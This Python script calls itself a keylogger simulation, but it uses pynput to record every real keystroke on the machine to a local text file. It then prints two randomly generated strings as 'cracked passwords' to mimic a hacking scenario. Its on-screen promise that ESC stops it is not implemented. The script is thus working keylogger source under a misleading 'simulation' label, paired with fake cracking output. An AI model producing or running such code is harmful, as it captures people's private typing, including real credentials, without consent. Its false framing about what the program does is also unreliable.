from pynput import keyboard
import random
import time

# File to store the simulated keylogs
KEYLOG_FILE = "keylog_simulation.txt"

# Simulated fake password list
fake_passwords = [
    "Xx_RandomPass_3123!?",
    "H@ckM3_98765!!",
    "P@ssw0rd_Sup3rS3cure",
    "Admin_12345_R00t",
    "N0tReal_P@ss_09876"
] + [f"User{random.randint(1000,9999)}_Pass{random.randint(10000,99999)}"
     for _ in range(1495)]  # Generates 1,495 more fake passwords

# Randomly select 2 "cracked" passwords
cracked_passwords = random.sample(fake_passwords, 2)


def on_press(key):
    """Handles key press events."""
    try:
        with open(KEYLOG_FILE, "a") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")
            else:
                file.write(key.char)
    except AttributeError:
        pass  # Ignore special keys like shift, ctrl


def start_keylogger():
    """Starts the keylogger simulation."""
    print("[*] Keylogger simulation running... (Press ESC to stop)")
    with open(KEYLOG_FILE, "w") as file:
        file.write("[*] Simulated Keylogger Started\n")

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Stopping simulation...")
        listener.stop()
        show_fake_cracked_passwords()


def show_fake_cracked_passwords():
    """Displays fake cracked passwords to mimic a realistic scenario."""
    print("\n[*] Simulation Complete! Fake cracked passwords:\n")
    for pw in cracked_passwords:
        print(f" - {pw}")

    print(f"\n[*] Keylog saved in: {KEYLOG_FILE}")


# Run the simulation
if __name__ == "__main__":
    start_keylogger()
